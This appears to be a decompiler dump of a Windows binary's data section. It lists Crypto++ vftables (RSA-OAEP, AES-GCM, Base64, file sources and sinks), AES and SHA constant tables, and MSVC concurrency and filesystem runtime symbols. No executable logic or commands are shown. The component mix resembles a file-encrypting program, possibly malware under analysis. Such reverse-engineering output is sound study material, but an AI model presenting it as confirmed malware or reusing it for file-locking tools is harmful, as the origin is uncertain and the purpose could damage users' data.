__m128i stru_4BACE0 = { { -1, -1, 0, 0, -1, -1, 0, 0, -1, -1, 0, 0, -1, -1, 0, 0 } }; // weak
int dword_4BACF0[9] = { 2, 2, 2, 4, 4, 8, 8, 8, 8 }; // weak
void *CryptoPP::Integer::DivideByZero::`vftable' = &sub_432D90; // weak
void *CryptoPP::Integer::RandomNumberNotFound::`vftable' = &sub_432D90; // weak
void *CryptoPP::Integer::`vftable' = &sub_43E6F0; // weak
void *CryptoPP::KDF2_RNG::`vftable' = &sub_43E770; // weak
void *CryptoPP::EuclideanDomainOf<CryptoPP::Integer>::`vftable' = &sub_43E6D0; // weak
void *CryptoPP::AlgorithmParametersTemplate<enum CryptoPP::Integer::RandomNumberType>::`vftable' = &sub_439180; // weak
__int128 xmmword_4BAFC0 = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFi64; // weak
void *CryptoPP::PKCS1v15_SignatureMessageEncodingMethod::`vftable' = &sub_436660; // weak
void *CryptoPP::OAEP<CryptoPP::SHA1,CryptoPP::P1363_MGF1>::`vftable' = &sub_41D2A0; // weak
void *CryptoPP::RSAFunction::`vftable' = &sub_40A650; // weak
void *CryptoPP::RSAFunction::`vftable' = &sub_4284EE; // weak
void *CryptoPP::RSAFunction::`vftable' = &sub_4284A3; // weak
void *CryptoPP::InvertibleRSAFunction::`vftable' = &sub_414AF0; // weak
void *CryptoPP::InvertibleRSAFunction::`vftable' = &sub_42848B; // weak
void *CryptoPP::InvertibleRSAFunction::`vftable' = &sub_42841B; // weak
void *CryptoPP::InvertibleRSAFunction::`vftable' = &sub_428473; // weak
void *CryptoPP::InvertibleRSAFunction::`vftable' = &sub_450140; // weak
void *CryptoPP::InvertibleRSAFunction::`vftable' = &sub_4284E3; // weak
void *CryptoPP::RSAPrimeSelector::`vftable' = &sub_451190; // weak
void *CryptoPP::TF_SignerImpl<CryptoPP::TF_SignatureSchemeOptions<CryptoPP::TF_SS<CryptoPP::RSA,CryptoPP::PKCS1v15,CryptoPP::SHA1,int>,CryptoPP::RSA,CryptoPP::PKCS1v15_SignatureMessageEncodingMethod,CryptoPP::SHA1>>::`vftable' = &loc_44F480; // weak
void *CryptoPP::TF_SignerImpl<CryptoPP::TF_SignatureSchemeOptions<CryptoPP::TF_SS<CryptoPP::RSA,CryptoPP::PKCS1v15,CryptoPP::SHA1,int>,CryptoPP::RSA,CryptoPP::PKCS1v15_SignatureMessageEncodingMethod,CryptoPP::SHA1>>::`vftable' = &sub_44F457; // weak
void *CryptoPP::TF_SignerImpl<CryptoPP::TF_SignatureSchemeOptions<CryptoPP::TF_SS<CryptoPP::RSA,CryptoPP::PKCS1v15,CryptoPP::SHA1,int>,CryptoPP::RSA,CryptoPP::PKCS1v15_SignatureMessageEncodingMethod,CryptoPP::SHA1>>::`vftable' = &loc_44F45F; // weak
void *CryptoPP::TF_VerifierImpl<CryptoPP::TF_SignatureSchemeOptions<CryptoPP::TF_SS<CryptoPP::RSA,CryptoPP::PKCS1v15,CryptoPP::SHA1,int>,CryptoPP::RSA,CryptoPP::PKCS1v15_SignatureMessageEncodingMethod,CryptoPP::SHA1>>::`vftable' = &sub_44F4C0; // weak
void *CryptoPP::TF_VerifierImpl<CryptoPP::TF_SignatureSchemeOptions<CryptoPP::TF_SS<CryptoPP::RSA,CryptoPP::PKCS1v15,CryptoPP::SHA1,int>,CryptoPP::RSA,CryptoPP::PKCS1v15_SignatureMessageEncodingMethod,CryptoPP::SHA1>>::`vftable' = &loc_44F467; // weak
void *CryptoPP::TF_VerifierImpl<CryptoPP::TF_SignatureSchemeOptions<CryptoPP::TF_SS<CryptoPP::RSA,CryptoPP::PKCS1v15,CryptoPP::SHA1,int>,CryptoPP::RSA,CryptoPP::PKCS1v15_SignatureMessageEncodingMethod,CryptoPP::SHA1>>::`vftable' = &loc_44F46F; // weak
void *CryptoPP::TF_DecryptorImpl<CryptoPP::TF_CryptoSchemeOptions<CryptoPP::TF_ES<CryptoPP::RSA,CryptoPP::OAEP<CryptoPP::SHA1,CryptoPP::P1363_MGF1>,int>,CryptoPP::RSA,CryptoPP::OAEP<CryptoPP::SHA1,CryptoPP::P1363_MGF1>>>::`vftable' = &loc_44F480; // weak
void *CryptoPP::TF_DecryptorImpl<CryptoPP::TF_CryptoSchemeOptions<CryptoPP::TF_ES<CryptoPP::RSA,CryptoPP::OAEP<CryptoPP::SHA1,CryptoPP::P1363_MGF1>,int>,CryptoPP::RSA,CryptoPP::OAEP<CryptoPP::SHA1,CryptoPP::P1363_MGF1>>>::`vftable' = &sub_44F457; // weak
void *CryptoPP::TF_DecryptorImpl<CryptoPP::TF_CryptoSchemeOptions<CryptoPP::TF_ES<CryptoPP::RSA,CryptoPP::OAEP<CryptoPP::SHA1,CryptoPP::P1363_MGF1>,int>,CryptoPP::RSA,CryptoPP::OAEP<CryptoPP::SHA1,CryptoPP::P1363_MGF1>>>::`vftable' = &loc_44F45F; // weak
void *CryptoPP::TF_EncryptorImpl<CryptoPP::TF_CryptoSchemeOptions<CryptoPP::TF_ES<CryptoPP::RSA,CryptoPP::OAEP<CryptoPP::SHA1,CryptoPP::P1363_MGF1>,int>,CryptoPP::RSA,CryptoPP::OAEP<CryptoPP::SHA1,CryptoPP::P1363_MGF1>>>::`vftable' = &sub_41D220; // weak
void *CryptoPP::TF_EncryptorImpl<CryptoPP::TF_CryptoSchemeOptions<CryptoPP::TF_ES<CryptoPP::RSA,CryptoPP::OAEP<CryptoPP::SHA1,CryptoPP::P1363_MGF1>,int>,CryptoPP::RSA,CryptoPP::OAEP<CryptoPP::SHA1,CryptoPP::P1363_MGF1>>>::`vftable' = &sub_428343; // weak
void *CryptoPP::TF_EncryptorImpl<CryptoPP::TF_CryptoSchemeOptions<CryptoPP::TF_ES<CryptoPP::RSA,CryptoPP::OAEP<CryptoPP::SHA1,CryptoPP::P1363_MGF1>,int>,CryptoPP::RSA,CryptoPP::OAEP<CryptoPP::SHA1,CryptoPP::P1363_MGF1>>>::`vftable' = &sub_42838B; // weak
void *CryptoPP::AlgorithmParametersTemplate<CryptoPP::PrimeSelector const *>::`vftable' = &sub_439180; // weak
void *CryptoPP::BufferedTransformation::BlockingInputOnly::`vftable' = &sub_432D90; // weak
void *CryptoPP::BufferedTransformation::InvalidChannelName::`vftable' = &sub_432D90; // weak
void *CryptoPP::FilterWithBufferedInput::`vftable' = &sub_406DE0; // weak
void *CryptoPP::FilterWithBufferedInput::`vftable' = &sub_428333; // weak
void *off_4BB62C = &loc_453160; // weak
void *off_4BB724 = &loc_4530CB; // weak
void *off_4BB734 = &loc_4530D3; // weak
void *off_4BB73C = &loc_4530E0; // weak
int (__stdcall *off_4BB834)(char) = &sub_4530B3; // weak
void *off_4BB844 = &loc_4530BB; // weak
void *CryptoPP::OutputProxy::`vftable' = &sub_453130; // weak
void *CryptoPP::OutputProxy::`vftable' = &loc_4530C3; // weak
void *CryptoPP::ProxyFilter::`vftable' = &sub_406EE0; // weak
void *CryptoPP::ProxyFilter::`vftable' = &sub_4283AB; // weak
void *CryptoPP::AlgorithmParametersTemplate<enum CryptoPP::BlockPaddingSchemeDef::BlockPaddingScheme>::`vftable' = &sub_439180; // weak
void *CryptoPP::AlgorithmParameters::`vftable' = &sub_4550E0; // weak
void *std::codecvt_base::`vftable' = &sub_402020; // weak
void *CryptoPP::FileStore::Err::`vftable' = &sub_432D90; // weak
void *CryptoPP::FileStore::OpenErr::`vftable' = &sub_432D90; // weak
void *CryptoPP::FileStore::ReadErr::`vftable' = &sub_432D90; // weak
void *CryptoPP::FileSink::Err::`vftable' = &sub_432D90; // weak
void *CryptoPP::FileSink::OpenErr::`vftable' = &sub_432D90; // weak
void *CryptoPP::FileSink::WriteErr::`vftable' = &sub_432D90; // weak
void *std::filebuf::`vftable' = &sub_41CFE0; // weak
void *std::ifstream::`vftable' = &sub_4283FB; // weak
void *std::ofstream::`vftable' = &sub_428443; // weak
void *std::codecvt<char,char,_Mbstatet>::`vftable' = &sub_41FE10; // weak
void *CryptoPP::OS_RNG_Err::`vftable' = &sub_432D90; // weak
void *CryptoPP::NonblockingRng::`vftable' = &sub_457560; // weak
_UNKNOWN unk_4BC04C; // weak
void *CryptoPP::AuthenticatedSymmetricCipher::BadState::`vftable' = &sub_432D90; // weak
void *std::bad_alloc::`vftable' = &sub_45ABE0; // weak
int SHA512_Constants_4BC310[] = { 1116352408 }; // weak
int SHA512_Constants_4BC314[] = { 1899447441 }; // weak
int SHA512_Constants_4BC318[] = { -1245643825 }; // weak
int SHA512_Constants_4BC31C[] = { -373957723 }; // weak
int dword_4BC320[] = { 961987163 }; // weak
int dword_4BC324[] = { 1508970993 }; // weak
int dword_4BC328[] = { -1841331548 }; // weak
int dword_4BC32C[] = { -1424204075 }; // weak
int dword_4BC330[] = { -670586216 }; // weak
int dword_4BC334[] = { 310598401 }; // weak
int dword_4BC338[] = { 607225278 }; // weak
int dword_4BC33C[] = { 1426881987 }; // weak
int dword_4BC340[] = { 1925078388 }; // weak
int dword_4BC344[] = { -2132889090 }; // weak
int dword_4BC348[] = { -1680079193 }; // weak
int dword_4BC34C[33] =
{
  -1046744716,
  -459576895,
  -272742522,
  264347078,
  604807628,
  770255983,
  1249150122,
  1555081692,
  1996064986,
  -1740746414,
  -1473132947,
  -1341970488,
  -1084653625,
  -958395405,
  -710438585,
  113926993,
  338241895,
  666307205,
  773529912,
  1294757372,
  1396182291,
  1695183700,
  1986661051,
  -2117940946,
  -1838011259,
  -1564481375,
  -1474664885,
  -1035236496,
  -949202525,
  -778901479,
  -694614492,
  -200395387,
  275423344
}; // weak
_UNKNOWN unk_4BC3D0; // weak
_UNKNOWN SHA256_Constants_4BC698; // weak
_UNKNOWN SHA256_Constants_4BC6A8; // weak
__int128 xmmword_4BC6C0 = 0xC0D0E0F08090A0B0405060700010203i64; // weak
void *CryptoPP::ByteQueue::`vftable' = &sub_45F300; // weak
void *CryptoPP::ByteQueue::`vftable' = &sub_45F2E9; // weak
void *CryptoPP::HashInputTooLong::`vftable' = &sub_432D90; // weak
__int128 xmmword_4BC840 = 0x8090A0B0C0D0E0F0001020304050607i64; // weak
void *CryptoPP::RandomPool::`vftable' = &sub_4621A0; // weak
_UNKNOWN unk_4BCD00; // weak
void *CryptoPP::MessageQueue::`vftable' = &sub_466C10; // weak
void *CryptoPP::MessageQueue::`vftable' = &sub_466BFD; // weak
_UNKNOWN unk_4BCE24; // weak
__int128 xmmword_4BCE50 = 0x1000000000000000000000000000000i64; // weak
char RijnDael_AES_LONG_4BCE60[256] =
{
  'c',
  '|',
  'w',
  '{',
  '\xF2',
  'k',
  'o',
  '\xC5',
  '0',
  '\x01',
  'g',
  '+',
  '\xFE',
  '\xD7',
  '\xAB',
  'v',
  '\xCA',
  '\x82',
  '\xC9',
  '}',
  '\xFA',
  'Y',
  'G',
  '\xF0',
  '\xAD',
  '\xD4',
  '\xA2',
  '\xAF',
  '\x9C',
  '\xA4',
  'r',
  '\xC0',
  '\xB7',
  '\xFD',
  '\x93',
  '&',
  '6',
  '?',
  '\xF7',
  '\xCC',
  '4',
  '\xA5',
  '\xE5',
  '\xF1',
  'q',
  '\xD8',
  '1',
  '\x15',
  '\x04',
  '\xC7',
  '#',
  '\xC3',
  '\x18',
  '\x96',
  '\x05',
  '\x9A',
  '\a',
  '\x12',
  '',
  '\xE2',
  '\xEB',
  '\'',
  '\xB2',
  'u',
  '\t',
  '\x83',
  ',',
  '\x1A',
  '\x1B',
  'n',
  'Z',
  '\xA0',
  'R',
  ';',
  '\xD6',
  '\xB3',
  ')',
  '\xE3',
  '/',
  '\x84',
  'S',
  '\xD1',
  '\0',
  '\xED',
  ' ',
  '\xFC',
  '\xB1',
  '[',
  'j',
  '\xCB',
  '\xBE',
  '9',
  'J',
  'L',
  'X',
  '\xCF',
  '\xD0',
  '\xEF',
  '\xAA',
  '\xFB',
  'C',
  'M',
  '3',
  '\x85',
  'E',
  '\xF9',
  '\x02',
  '\x7F',
  'P',
  '<',
  '\x9F',
  '\xA8',
  'Q',
  '\xA3',
  '@',
  '\x8F',
  '\x92',
  '\x9D',
  '8',
  '\xF5',
  '\xBC',
  '\xB6',
  '\xDA',
  '!',
  '\x10',
  '\xFF',
  '\xF3',
  '\xD2',
  '\xCD',
  '\f',
  '\x13',
  '\xEC',
  '_',
  '\x97',
  'D',
  '\x17',
  '\xC4',
  '\xA7',
  '~',
  '=',
  'd',
  ']',
  '\x19',
  's',
  '`',
  '\x81',
  'O',
  '\xDC',
  '\"',
  '*',
  '\x90',
  '\x88',
  'F',
  '\xEE',
  '\xB8',
  '\x14',
  '\xDE',
  '^',
  '\v',
  '\xDB',
  '\xE0',
  '2',
  ':',
  '\n',
  'I',
  '\x06',
  '$',
  '\\',
  '\xC2',
  '\xD3',
  '\xAC',
  'b',
  '\x91',
  '\x95',
  '\xE4',
  'y',
  '\xE7',
  '\xC8',
  '7',
  'm',
  '\x8D',
  '\xD5',
  'N',
  '\xA9',
  'l',
  'V',
  '\xF4',
  '\xEA',
  'e',
  'z',
  '\xAE',
  '\b',
  '\xBA',
  'x',
  '%',
  '.',
  '\x1C',
  '\xA6',
  '\xB4',
  '\xC6',
  '\xE8',
  '\xDD',
  't',
  '\x1F',
  'K',
  '\xBD',
  '\x8B',
  '\x8A',
  'p',
  '>',
  '\xB5',
  'f',
  'H',
  '\x03',
  '\xF6',
  '\x0E',
  'a',
  '5',
  'W',
  '\xB9',
  '\x86',
  '\xC1',
  '\x1D',
  '\x9E',
  '\xE1',
  '\xF8',
  '\x98',
  '\x11',
  'i',
  '\xD9',
  '\x8E',
  '\x94',
  '\x9B',
  '\x1E',
  '\x87',
  '\xE9',
  '\xCE',
  'U',
  '(',
  '\xDF',
  '\x8C',
  '\xA1',
  '\x89',
  '\r',
  '\xBF',
  '\xE6',
  'B',
  'h',
  'A',
  '\x99',
  '-',
  '\x0F',
  '\xB0',
  'T',
  '\xBB',
  '\x16'
}; // weak
char RijnDael_AES_inv_LONG_4BCF60[256] =
{
  'R',
  '\t',
  'j',
  '\xD5',
  '0',
  '6',
  '\xA5',
  '8',
  '\xBF',
  '@',
  '\xA3',
  '\x9E',
  '\x81',
  '\xF3',
  '\xD7',
  '\xFB',
  '|',
  '\xE3',
  '9',
  '\x82',
  '\x9B',
  '/',
  '\xFF',
  '\x87',
  '4',
  '\x8E',
  'C',
  'D',
  '\xC4',
  '\xDE',
  '\xE9',
  '\xCB',
  'T',
  '{',
  '\x94',
  '2',
  '\xA6',
  '\xC2',
  '#',
  '=',
  '\xEE',
  'L',
  '\x95',
  '\v',
  'B',
  '\xFA',
  '\xC3',
  'N',
  '\b',
  '.',
  '\xA1',
  'f',
  '(',
  '\xD9',
  '$',
  '\xB2',
  'v',
  '[',
  '\xA2',
  'I',
  'm',
  '\x8B',
  '\xD1',
  '%',
  'r',
  '\xF8',
  '\xF6',
  'd',
  '\x86',
  'h',
  '\x98',
  '\x16',
  '\xD4',
  '\xA4',
  '\\',
  '\xCC',
  ']',
  'e',
  '\xB6',
  '\x92',
  'l',
  'p',
  'H',
  'P',
  '\xFD',
  '\xED',
  '\xB9',
  '\xDA',
  '^',
  '\x15',
  'F',
  'W',
  '\xA7',
  '\x8D',
  '\x9D',
  '\x84',
  '\x90',
  '\xD8',
  '\xAB',
  '\0',
  '\x8C',
  '\xBC',
  '\xD3',
  '\n',
  '\xF7',
  '\xE4',
  'X',
  '\x05',
  '\xB8',
  '\xB3',
  'E',
  '\x06',
  '\xD0',
  ',',
  '\x1E',
  '\x8F',
  '\xCA',
  '?',
  '\x0F',
  '\x02',
  '\xC1',
  '\xAF',
  '\xBD',
  '\x03',
  '\x01',
  '\x13',
  '\x8A',
  'k',
  ':',
  '\x91',
  '\x11',
  'A',
  'O',
  'g',
  '\xDC',
  '\xEA',
  '\x97',
  '\xF2',
  '\xCF',
  '\xCE',
  '\xF0',
  '\xB4',
  '\xE6',
  's',
  '\x96',
  '\xAC',
  't',
  '\"',
  '\xE7',
  '\xAD',
  '5',
  '\x85',
  '\xE2',
  '\xF9',
  '7',
  '\xE8',
  '\x1C',
  'u',
  '\xDF',
  'n',
  'G',
  '\xF1',
  '\x1A',
  'q',
  '\x1D',
  ')',
  '\xC5',
  '\x89',
  'o',
  '\xB7',
  'b',
  '\x0E',
  '\xAA',
  '\x18',
  '\xBE',
  '\x1B',
  '\xFC',
  'V',
  '>',
  'K',
  '\xC6',
  '\xD2',
  'y',
  ' ',
  '\x9A',
  '\xDB',
  '\xC0',
  '\xFE',
  'x',
  '\xCD',
  'Z',
  '\xF4',
  '\x1F',
  '\xDD',
  '\xA8',
  '3',
  '\x88',
  '\a',
  '\xC7',
  '1',
  '\xB1',
  '\x12',
  '\x10',
  'Y',
  '\'',
  '',
  '\xEC',
  '_',
  '`',
  'Q',
  '\x7F',
  '\xA9',
  '\x19',
  '\xB5',
  'J',
  '\r',
  '-',
  '\xE5',
  'z',
  '\x9F',
  '\x93',
  '\xC9',
  '\x9C',
  '\xEF',
  '\xA0',
  '\xE0',
  ';',
  'M',
  '\xAE',
  '*',
  '\xF5',
  '\xB0',
  '\xC8',
  '\xEB',
  '\xBB',
  '<',
  '\x83',
  'S',
  '\x99',
  'a',
  '\x17',
  '+',
  '\x04',
  '~',
  '\xBA',
  'w',
  '\xD6',
  '&',
  '\xE1',
  'i',
  '\x14',
  'c',
  'U',
  '!',
  '\f',
  '}'
}; // weak
_UNKNOWN unk_4BD060; // weak
__int128 xmmword_4BD0C0 = 0x102030405060708090A0B0C0D0E0Fi64; // weak
__int128 xmmword_4BD0D0 = 0x3020100070605040B0A09080F0E0D0Ci64; // weak
__int128 xmmword_4BD0E0 = 0xF0E0D0C0B0A09080706050403020100i64; // weak
__int128 xmmword_4BD220 = 0xC200000000000000E100000000000000i64; // weak
int (__stdcall *`anonymous namespace'::DefaultErrStreamBuf::`vftable')(char) = &sub_468B00; // weak
void *std::ctype<wchar_t>::`vftable' = &sub_402AE0; // weak
void *Concurrency::details::stl_condition_variable_vista::`vftable' = &Concurrency::details::stl_condition_variable_vista::wait; // weak
void *Concurrency::details::stl_condition_variable_win7::`vftable' = &Concurrency::details::stl_condition_variable_win7::wait; // weak
void *Concurrency::details::stl_condition_variable_concrt::`vftable' = &Concurrency::details::stl_condition_variable_concrt::wait; // weak
void *std::_System_error_category::`vftable' = &sub_403210; // weak
void *std::logic_error::`vftable' = &unknown_libname_12; // weak
void *std::invalid_argument::`vftable' = &unknown_libname_12; // weak
void *std::length_error::`vftable' = &unknown_libname_12; // weak
void *std::out_of_range::`vftable' = &unknown_libname_12; // weak
void *std::codecvt<wchar_t,char,_Mbstatet>::`vftable' = &sub_4023E0; // weak
void *std::wstreambuf::`vftable' = &sub_41CE90; // weak
void *std::wfilebuf::`vftable' = &sub_41CCC0; // weak
void *std::wios::`vftable' = &sub_41CF10; // weak
void *std::wostream::`vftable' = &sub_4283F3; // weak
char *const Mode = &unk_4BE0A4; // idb
wchar_t *const off_4BE0D4 = &unk_4BE110; // idb
int dword_4BE15C[] = { 1 }; // weak
int dword_4BE160[14] = { 2, 18, 10, 33, 34, 50, 42, 3, 19, 11, 35, 51, 43, 0 }; // weak
int dword_4BE198[] = { 1 }; // weak
int dword_4BE19C[14] = { 2, 18, 10, 33, 34, 50, 42, 3, 19, 11, 35, 51, 43, 0 }; // weak
void *Concurrency::details::stl_critical_section_vista::`vftable' = &Concurrency::details::stl_critical_section_vista::lock; // weak
void *Concurrency::details::stl_critical_section_win7::`vftable' = &sub_46A6C8; // weak
void *Concurrency::details::stl_critical_section_concrt::`vftable' = &sub_46A6B5; // weak
void *std::num_put<wchar_t,std::ostreambuf_iterator<wchar_t>>::`vftable' = &sub_41FE90; // weak
void *std::numpunct<wchar_t>::`vftable' = &sub_421480; // weak
void *type_info::`vftable' = &sub_46C88B; // weak
void *std::bad_array_new_length::`vftable' = &unknown_libname_12; // weak
void *Concurrency::details::WaitBlock::`vftable' = &_purecall; // weak
void *Concurrency::details::SingleWaitBlock::`vftable' = &sub_46DFF8; // weak
void *Concurrency::details::MultiWaitBlock::`vftable' = &_purecall; // weak
void *Concurrency::details::WaitAllBlock::`vftable' = &sub_46E0AB; // weak
void *Concurrency::details::WaitAnyBlock::`vftable' = &sub_46E0F2; // weak
void *Concurrency::details::TimedSingleWaitBlock::`vftable' = &sub_46E052; // weak
void *Concurrency::details::_MallocaArrayHolder<Concurrency::Context *>::`vftable' = &sub_46DD81; // weak
void *Concurrency::improper_lock::`vftable' = &unknown_libname_12; // weak
void *Concurrency::scheduler_resource_allocation_error::`vftable' = &std::regex_error::`scalar deleting destructor'; // weak
void *Concurrency::invalid_operation::`vftable' = &unknown_libname_12; // weak
void *Concurrency::unsupported_os::`vftable' = &unknown_libname_12; // weak
void *Concurrency::details::GlobalCore::TopologyObject::`vftable' = &sub_471C3F; // weak
void *Concurrency::details::GlobalNode::TopologyObject::`vftable' = &sub_471C56; // weak
void *Concurrency::details::ResourceManager::`vftable' = &sub_472E4B; // weak
void *Concurrency::improper_scheduler_attach::`vftable' = &unknown_libname_12; // weak
void *Concurrency::improper_scheduler_reference::`vftable' = &unknown_libname_12; // weak
void *Concurrency::ScheduleGroup::`vftable' = &_purecall; // weak
void *Concurrency::Scheduler::`vftable' = &sub_474573; // weak
void *Concurrency::details::RealizedChore::`vftable' = &std::_Ref_count<__ExceptionPtr>::`scalar deleting destructor'; // weak
void *Concurrency::details::SchedulerBase::`vftable' = &sub_474596; // weak
void *Concurrency::details::CacheLocalScheduleGroupSegment::`vftable' = &sub_4744E5; // weak
void *Concurrency::details::CacheLocalScheduleGroup::`vftable' = &sub_47FF40; // weak
void *Concurrency::details::FairScheduleGroupSegment::`vftable' = &sub_4744E5; // weak
void *Concurrency::details::FairScheduleGroup::`vftable' = &sub_47FF40; // weak
void *Concurrency::scheduler_worker_creation_error::`vftable' = &std::regex_error::`scalar deleting destructor'; // weak
void *Concurrency::context_unblock_unbalanced::`vftable' = &unknown_libname_12; // weak
void *Concurrency::context_self_unblock::`vftable' = &unknown_libname_12; // weak
void *Concurrency::missing_wait::`vftable' = &unknown_libname_12; // weak
void *Concurrency::invalid_scheduler_policy_key::`vftable' = &unknown_libname_12; // weak
void *Concurrency::invalid_scheduler_policy_value::`vftable' = &unknown_libname_12; // weak
void *Concurrency::invalid_scheduler_policy_thread_specification::`vftable' = &unknown_libname_12; // weak
void *Concurrency::nested_scheduler_missing_detach::`vftable' = &unknown_libname_12; // weak
void *Concurrency::invalid_oversubscribe_operation::`vftable' = &unknown_libname_12; // weak
void *Concurrency::Context::`vftable' = &_purecall; // weak
void *Concurrency::details::ContextBase::`vftable' = &sub_428750; // weak
int dword_4C0C40[36] =
{
  0,
  1,
  2,
  3,
  4,
  5,
  1,
  1,
  2,
  4,
  4,
  5,
  2,
  2,
  2,
  4,
  4,
  5,
  3,
  4,
  4,
  3,
  4,
  5,
  4,
  4,
  4,
  4,
  4,
  5,
  5,
  5,
  5,
  5,
  5,
  5
}; // weak
void *Concurrency::details::_Interruption_exception::`vftable' = &unknown_libname_12; // weak
void *Concurrency::details::_RefCounter::`vftable' = &unknown_libname_32; // weak
void *Concurrency::details::_CancellationTokenRegistration::`vftable' = &sub_478D58; // weak
void *Concurrency::details::CancellationTokenRegistration_TaskProc::`vftable' = &sub_478D36; // weak
void *Concurrency::details::_MallocaArrayHolder<Concurrency::event *>::`vftable' = &sub_478D0A; // weak
void *Concurrency::details::ExecutionResource::`vftable' = &sub_479EE9; // weak
void *Concurrency::details::SchedulerProxy::`vftable' = &sub_47B67E; // weak
void *Concurrency::details::FreeThreadProxy::`vftable' = &sub_481C88; // weak
void *Concurrency::details::IThreadProxyFactory::`vftable' = &_purecall; // weak
int dword_4C0EE4[4] = { 0, 64, 256, 1024 }; // weak
int off_4C0EF4 = 5061256; // weak
void *Concurrency::details::ThreadProxyFactory<Concurrency::details::FreeThreadProxy>::`vftable' = &sub_47BCCC; // weak
void *Concurrency::details::FreeThreadProxyFactory::`vftable' = &sub_47BCCC; // weak
_UNKNOWN unk_4C0F4C; // weak
_DWORD dword_4C0F6C[4] = { -502718582, 1194401290, -720526716, 1632799356 }; // weak
_DWORD dword_4C0F8C[4] = { 1462214671, 1159286974, 1777817218, -872517224 }; // weak
_DWORD dword_4C0FAC[4] = { 791117919, 1321997942, -1333855594, 791692445 }; // weak
void *Concurrency::details::VirtualProcessor::`vftable' = &sub_47C33C; // weak
int dword_4C10D8[98] =
{
  8,
  16,
  24,
  32,
  40,
  48,
  56,
  64,
  72,
  80,
  88,
  96,
  104,
  112,
  120,
  128,
  136,
  144,
  152,
  160,
  168,
  176,
  184,
  192,
  200,
  208,
  216,
  224,
  232,
  240,
  248,
  256,
  272,
  288,
  304,
  320,
  336,
  352,
  368,
  384,
  400,
  416,
  432,
  448,
  464,
  480,
  496,
  512,
  544,
  576,
  608,
  640,
  672,
  704,
  736,
  768,
  800,
  832,
  864,
  896,
  928,
  960,
  992,
  1024,
  1088,
  1152,
  1216,
  1280,
  1344,
  1408,
  1472,
  1536,
  1600,
  1664,
  1728,
  1792,
  1856,
  1920,
  1984,
  2048,
  2176,
  2304,
  2432,
  2560,
  2688,
  2816,
  2944,
  3072,
  3200,
  3328,
  3456,
  3584,
  3712,
  3840,
  3968,
  4096,
  3,
  4096
}; // weak
void *Concurrency::IExecutionContext::`vftable' = &_purecall; // weak
void *Concurrency::details::InternalContextBase::`vftable' = &sub_4190D0; // weak
void *Concurrency::details::InternalContextBase::`vftable' = &sub_47DF22; // weak
void *Concurrency::details::ScheduleGroupSegmentBase::`vftable' = &sub_47F25D; // weak
void *Concurrency::details::ScheduleGroupBase::`vftable' = &sub_47FF40; // weak
void *Concurrency::details::ExternalContextBase::`vftable' = &sub_428750; // weak
void *Concurrency::IScheduler::`vftable' = &_purecall; // weak
void *Concurrency::details::ThreadInternalContext::`vftable' = &sub_4190D0; // weak
void *Concurrency::details::ThreadInternalContext::`vftable' = &sub_47DF22; // weak
void *Concurrency::details::ThreadScheduler::`vftable' = &sub_480ACF; // weak
void *Concurrency::details::ThreadScheduler::`vftable' = &loc_4809B7; // weak
void *Concurrency::details::VirtualProcessorRoot::`vftable' = &sub_479EE5; // weak
void *Concurrency::details::FreeVirtualProcessorRoot::`vftable' = &sub_479EE5; // weak
void *Concurrency::details::ThreadProxy::`vftable' = &sub_481C88; // weak
void *Concurrency::details::ThreadVirtualProcessor::`vftable' = &sub_4833EE; // weak
void *std::bad_typeid::`vftable' = &unknown_libname_12; // weak
void *std::__non_rtti_object::`vftable' = &unknown_libname_12; // weak
void *std::bad_exception::`vftable' = &unknown_libname_12; // weak
_UNKNOWN unk_4C4C6C; // weak
char byte_4CCC25[3] = { '\0', '\0', '\0' }; // weak
_DWORD dword_4CCF90[2] = { 0, 252 }; // weak
_DWORD dword_4CD254[2] = { 0, 52 }; // weak
void *CryptoPP::FileSink::`vftable' = &sub_407D20; // weak
void *CryptoPP::Grouper::`vftable' = &sub_4083B0; // weak
_UNKNOWN unk_4CF2AC; // weak
void *CryptoPP::Base64Encoder::`vftable' = &sub_4284DB; // weak
void *CryptoPP::Base64Decoder::`vftable' = &sub_428506; // weak
_UNKNOWN unk_4CF2D4; // weak
void *CryptoPP::SimpleProxyFilter::`vftable' = &sub_406F80; // weak
void *off_4CF3DC = &loc_4284CB; // weak
void *std::_LaunchPad<std::unique_ptr<std::tuple<void (__cdecl *)(std::wstring const &,std::string,std::wstring,unsigned char * const,std::wstring,std::wstring),std::wstring,std::string,std::wstring,unsigned char *,std::wstring,std::wstring>>>::`vftable' = &sub_427320; // weak
_UNKNOWN unk_4CF3F0; // weak
void *CryptoPP::SourceTemplate<CryptoPP::FileStore>::`vftable' = &sub_42845B; // weak
int (__stdcall *off_4CF40C)(char) = &sub_407970; // weak
_UNKNOWN unk_4CF4C4; // weak
void *CryptoPP::FileSource::`vftable' = &sub_407B90; // weak
void *CryptoPP::Base64Decoder::`vftable' = &sub_409080; // weak
void *off_4CF66C = &loc_4283C3; // weak
void *CryptoPP::AlgorithmParametersTemplate<char const *>::`vftable' = &sub_41D480; // weak
void *CryptoPP::FileSink::`vftable' = &sub_4283BB; // weak
void *CryptoPP::SourceTemplate<CryptoPP::FileStore>::`vftable' = &sub_41C820; // weak
void *off_4CF768 = &loc_4284C3; // weak
void *CryptoPP::PK_EncryptorFilter::`vftable' = &sub_4284DB; // weak
void *std::wofstream::`vftable' = &sub_4284D3; // weak
void *CryptoPP::GCM_Final<CryptoPP::Rijndael,0,1>::`vftable' = &sub_428383; // weak
void *CryptoPP::GCM_Final<CryptoPP::Rijndael,0,1>::`vftable' = &sub_40A330; // weak
void *std::wistream::`vftable' = &sub_42846B; // weak
void *off_4CF888 = &loc_4283DB; // weak
void *CryptoPP::FileSource::`vftable' = &sub_4284AB; // weak
void *std::_LaunchPad<std::unique_ptr<std::tuple<void (__cdecl *)(std::wstring const &,std::wstring,std::wstring,std::wstring,std::wstring),std::wstring,std::wstring,std::wstring,std::wstring,std::wstring>>>::`vftable' = &sub_427310; // weak
void *CryptoPP::AlgorithmParametersTemplate<wchar_t const *>::`vftable' = &sub_41D480; // weak
void *std::filesystem::filesystem_error::`vftable' = &sub_404760; // weak
void *std::wiostream::`vftable' = &sub_4283EB; // weak
_UNKNOWN unk_4CF904; // weak
int (__stdcall *off_4CF910)(int) = &sub_40A8C0; // weak
void *CryptoPP::BaseN_Encoder::`vftable' = &sub_428393; // weak
void *std::wfstream::`vftable' = &sub_428453; // weak
void *off_4CF97C = &loc_42835B; // weak
void *CryptoPP::BaseN_Encoder::`vftable' = &sub_408010; // weak
void *CryptoPP::SimpleProxyFilter::`vftable' = &sub_428373; // weak
